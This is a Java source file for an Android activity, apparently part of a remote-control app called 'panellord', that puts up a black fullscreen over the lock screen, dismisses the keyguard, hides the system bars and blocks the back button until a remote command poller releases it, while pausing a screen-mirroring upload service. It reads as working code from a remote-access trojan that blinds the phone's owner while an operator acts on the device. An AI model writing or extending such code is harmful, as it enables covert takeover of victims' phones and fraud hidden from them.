package com.panellord;

import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * Shows a permanent black screen until CommandPoller calls dismiss().
 * Does NOT auto-close. Back button is blocked.
 * Screen stays on (FLAG_KEEP_SCREEN_ON).
 * Shows over lock screen (FLAG_SHOW_WHEN_LOCKED).
 */
public class BlackScreenActivity extends Activity {

    private static volatile BlackScreenActivity instance;

    /** Called by CommandPoller to close the black screen */
    public static void dismiss() {
        BlackScreenActivity a = instance;
        if (a != null && !a.isFinishing()) {
            a.runOnUiThread(a::finish);
        }
        instance = null;
    }

    public static boolean isActive() {
        BlackScreenActivity a = instance;
        return a != null && !a.isFinishing();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        instance = this;

        // Fullscreen, stays on, shows over lock screen
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN
            | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        );

        LinearLayout root = new LinearLayout(this);
        root.setBackgroundColor(Color.BLACK);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(android.view.Gravity.CENTER);

        TextView tv = new TextView(this);
        tv.setText(Config.BLACK_SCREEN_TEXT);
        tv.setTextColor(Color.parseColor("#CCCCCC"));
        tv.setTextSize(18f);
        tv.setGravity(android.view.Gravity.CENTER);
        tv.setPadding(48, 0, 48, 0);
        root.addView(tv);
        setContentView(root);

        // Full immersive: hide status bar + nav bar
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            | View.SYSTEM_UI_FLAG_FULLSCREEN
            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        );

        // Pause MJPEG uploads while black screen is showing
        ScreenMirrorService.setPaused(true);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (instance == this) instance = null;
        // Resume screen capture
        ScreenMirrorService.setPaused(false);
    }

    @Override
    public void onBackPressed() {
        // Block back button — only CommandPoller can dismiss
    }
}
